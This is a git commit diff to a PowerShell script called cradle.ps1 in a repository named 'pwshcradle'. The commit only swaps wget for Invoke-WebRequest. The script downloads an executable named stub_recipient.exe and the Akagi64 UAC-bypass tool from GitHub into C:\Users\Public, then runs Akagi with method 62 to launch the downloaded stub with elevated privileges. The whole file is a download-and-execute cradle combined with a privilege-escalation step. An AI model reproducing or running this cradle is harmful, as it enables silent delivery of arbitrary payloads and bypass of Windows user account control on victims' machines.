6ace62c305346932d485807fa10fd0ff8f6a3e13
Brothersextremegaming <125992368+Brothersextremegaming@users.noreply.github.com>
2026-02-24 09:17:37 +0530

    Update cradle.ps1

--- cradle.ps1
+++ cradle.ps1
@@ -1,5 +1,5 @@
-wget https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipient.exe -o C:\Users\Public\demo.exe
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipient.exe" -OutFile "C:\Users\Public\demo.exe"
 
-wget https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe -o C:\Users\Public\Akagi.exe
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "C:\Users\Public\Akagi.exe"
 
 C:\Users\Public\Akagi.exe 62 C:\Users\Public\demo.exe
